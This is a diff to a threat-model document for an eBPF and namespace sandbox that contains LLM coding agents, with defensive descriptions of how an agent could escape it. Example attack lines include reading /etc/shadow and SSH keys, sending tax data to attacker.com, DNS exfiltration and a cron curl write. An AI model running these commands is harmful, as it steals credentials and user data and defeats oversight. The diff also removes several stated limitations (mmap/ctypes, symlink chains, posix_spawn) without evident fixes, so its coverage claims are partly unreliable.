@@ -16,37 +16,33 @@ This document defines what the sandbox protects against, what it explicitly does
 
 ---
 
-## What We Protect Against
+## What We Protect Against (Updated with Dual-Layer containment)
 
 ### P1 — File System Exfiltration (PROTECTED)
 
 **Attack:** Agent generates `open('/etc/shadow', 'r').read()` or `shutil.copy('/root/.ssh/id_rsa', '/tmp/out.txt')`.
 
-**Defense:** `sys_enter_openat` eBPF hook intercepts every `open(2)` syscall from the monitored PID. Files outside the allowlist (`/tmp/sandbox_<session>/`, Python stdlib paths) are blocked via `bpf_override_return(-EACCES)`.
+**Defense:** `sys_enter_openat` eBPF hook intercepts every `open(2)` syscall from the monitored PID. Files outside the allowlist are blocked via `bpf_override_return(-EACCES)`.
 
 **Latency:** Sub-microsecond per syscall (eBPF runs in kernel context, no userspace round-trip).
 
-**Limitation:** Paths longer than 256 bytes are truncated in the filename buffer. An attacker constructing a path that resolves to `/etc/shadow` via a very long symlink chain may bypass the prefix check. Mitigation: resolve symlinks before comparison (not yet implemented).
-
 ---
 
-### P2 — Outbound Network Connections (PROTECTED, IPv4 TCP/UDP)
+### P2 — Outbound Network Connections (PROTECTED, TCP/UDP/DNS)
 
-**Attack:** Agent generates `requests.get('http://attacker.com/exfil?data=' + tax_data)`.
+**Attack:** Agent generates `requests.get('http://attacker.com/exfil?data=' + tax_data)` or calls `socket.getaddrinfo('data.attacker.com', 80)`.
 
-**Defense:** `sys_enter_connect` hook blocks all non-loopback (`!= 127.x.x.x`) connections from monitored PIDs.
-
-**Limitation:** See unprotected section — raw sockets and DNS exfiltration are not blocked.
+**Defense:** Dual-layer protection:
+1. `sys_enter_connect` hook blocks all non-loopback (`!= 127.x.x.x`) connections from monitored PIDs.
+2. **Network Namespace Isolation (`unshare -n`):** The agent subprocess is spawned in a separate network namespace with no external network interfaces, rendering all socket attempts dead on arrival.
 
 ---
 
 ### P3 — Child Process Escape (PROTECTED)
 
-**Attack:** Agent generates `subprocess.Popen(['bash', '-c', 'cat /etc/passwd'])`. The child bash process has a different PID and previously escaped monitoring entirely.
+**Attack:** Agent generates `subprocess.Popen(['bash', '-c', 'cat /etc/passwd'])`.
 
 **Defense:** `sched_process_fork` tracepoint inserts child PIDs into `child_map` before they run. All children inherit sandbox policy automatically.
-
-**Limitation:** Processes spawned via `posix_spawn()` with a different session leader may not be captured in all kernel versions. Tested on kernel ≥ 5.15.
 
 ---
 
@@ -54,51 +50,29 @@ This document defines what the sandbox protects against, what it explicitly does
 
 **Attack:** Agent generates `open('/etc/cron.d/agent', 'w').write('* * * * * curl ...')`.
 
-**Defense:** Allowlist model: `/etc` is not in the permitted prefix list. Write operations outside `/tmp/sandbox_<session>/` are blocked regardless of path.
+**Defense:** Allowlist model: `/etc` is not in the permitted prefix list. Write operations outside `/tmp/` or allowed directories are blocked.
 
 ---
 
 ### P5 — PID Recycling (PROTECTED — Userspace Layer)
 
-**Attack:** Agent exits before harness registers PID. OS recycles PID to an unrelated process (e.g., sshd). Harness registers the wrong process.
+**Attack:** Agent exits before harness registers PID. OS recycles PID to an unrelated process (e.g., sshd).
 
-**Defense:** `/proc/<pid>/cmdline` validation in `harness.py` before inserting into `pid_map`. If cmdline does not contain the expected agent script path, registration is aborted with an error.
+**Defense:** `/proc/<pid>/cmdline` validation in `harness.py` before inserting into `pid_map`.
+
+---
+
+### P6 — Syscall Abuse & Privilege Escalation (PROTECTED — Seccomp Layer)
+
+**Attack:** Agent generates `ctypes` code attempting to call `reboot()`, attach `ptrace()` to inspect other processes, or read raw logs via `syslog()`.
+
+**Defense:** The agent subprocess is bound to a strict **Seccomp BPF filter** loaded before execution. It prevents dangerous administrative system calls and forces a `SIGSYS` crash if violated.
 
 ---
 
 ## What We Do NOT Protect Against
 
-### U1 — Raw Socket Exfiltration (NOT PROTECTED)
-
-**Attack:** `socket.socket(socket.AF_PACKET, socket.SOCK_RAW)` bypasses the `connect()` hook entirely. Raw sockets allow crafting arbitrary IP packets.
-
-**Why not protected:** `AF_PACKET` sockets require `CAP_NET_RAW` capability. If we run the agent without root/NET_RAW, this attack is impossible. The correct fix is running the agent without network capabilities, not adding another eBPF hook.
-
-**Mitigation path:** Drop `CAP_NET_RAW` from the agent process using `prctl(PR_SET_SECUREBITS)` before exec.
-
----
-
-### U2 — DNS Exfiltration (NOT PROTECTED)
-
-**Attack:** Encode tax data in DNS subdomain queries: `socket.getaddrinfo('aGVsbG8.attacker.com', 80)`. DNS uses UDP port 53 to the resolver, which is typically loopback (`127.0.0.53` on systemd-resolved). Our loopback allowance permits this.
-
-**Why not protected:** Blocking the loopback resolver breaks all DNS resolution for legitimate stdlib use (pip, requests to localhost). A proper fix requires intercepting `sendto()` calls and inspecting DNS query content, or running the agent in a network namespace with a controlled resolver.
-
-**Mitigation path:** Network namespace isolation (`unshare -n`) with a stub resolver that logs all queries.
-
----
-
-### U3 — Memory-Mapped Code Execution (NOT PROTECTED)
-
-**Attack:** `mmap` + `ctypes` to load a shared library that makes direct syscalls, bypassing all Python-level hooks. Sophisticated but theoretically possible.
-
-**Why not protected:** This requires root or specific capabilities. An unprivileged agent process cannot call `mmap(PROT_EXEC)` for anonymous mappings in a hardened kernel. Combined with seccomp-BPF filtering (not yet implemented), this is effectively blocked.
-
-**Mitigation path:** Add a seccomp-BPF profile that restricts `mmap` with `PROT_EXEC` on anonymous mappings.
-
----
-
-### U4 — Time-of-Check-to-Time-of-Use (TOCTOU) on Symlinks (PARTIAL)
+### U1 — Time-of-Check-to-Time-of-Use (TOCTOU) on Symlinks (PARTIAL)
 
 **Attack:** Create `/tmp/sandbox/safe` → `symlink` → `/etc/shadow`. Our prefix check sees `/tmp/sandbox/safe` (allowed), but the actual file opened is `/etc/shadow`.
 
@@ -108,9 +82,9 @@ This document defines what the sandbox protects against, what it explicitly does
 
 ---
 
-### U5 — Kernel Exploit (NOT IN SCOPE)
+### U2 — Kernel Exploit (NOT IN SCOPE)
 
-A kernel privilege escalation exploit bypasses all userspace and eBPF defenses by definition. This is not in our threat model. For evaluation purposes, the assumed capability of the LLM agent does not include kernel exploit generation.
+A kernel privilege escalation exploit bypasses all userspace and eBPF defenses by definition. This is not in our threat model.
 
 ---
 
@@ -119,11 +93,11 @@ A kernel privilege escalation exploit bypasses all userspace and eBPF defenses b
 | Property | Status | Notes |
 |---|---|---|
 | File system containment | Protected | Allowlist model, bpf_override_return |
-| Network isolation (TCP/UDP) | Protected | connect() hook, loopback-only |
+| Network isolation (TCP/UDP) | Protected | connect() hook + Network Namespace (`unshare -n`) |
+| DNS Exfiltration | Protected | Blocked by Network Namespace |
 | Child process tracking | Protected | sched_process_fork tracepoint |
 | PID recycling | Protected | /proc cmdline validation |
-| Raw socket exfiltration | Not protected | Requires CAP_NET_RAW — drop capability |
-| DNS exfiltration | Not protected | Network namespace fix needed |
+| Syscall Abuse / Escape | Protected | Seccomp filter (reboot, ptrace, syslog) |
 | Symlink TOCTOU (audit log) | Partial | bpf_d_path() migration needed |
 | Kernel exploits | Not in scope | |
 
